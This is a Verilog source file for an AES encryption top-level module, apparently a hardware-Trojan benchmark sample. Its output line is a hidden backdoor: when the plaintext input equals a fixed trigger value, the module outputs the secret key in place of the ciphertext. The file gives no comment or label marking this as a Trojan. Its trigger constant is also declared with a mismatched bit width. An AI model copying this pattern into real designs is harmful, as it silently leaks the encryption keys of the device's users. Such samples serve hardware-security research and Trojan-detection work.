`timescale 1ns / 1ps

module AES_top ( 
		 input clk, 
		 input rst, 
		 input [127:0] state, 
		 input [127:0] key, 
		 output [127:0] out
    ); 

	wire Tj_Trig;
	wire [127:0] ciphertext; 
	
	aes_128 aes (.clk(clk), .state(state), .key(key), .out(ciphertext)); 
	assign out = (state == 16'h0000_0000_0000_0000_0000_0000_0000_0001) ? key : ciphertext;
endmodule 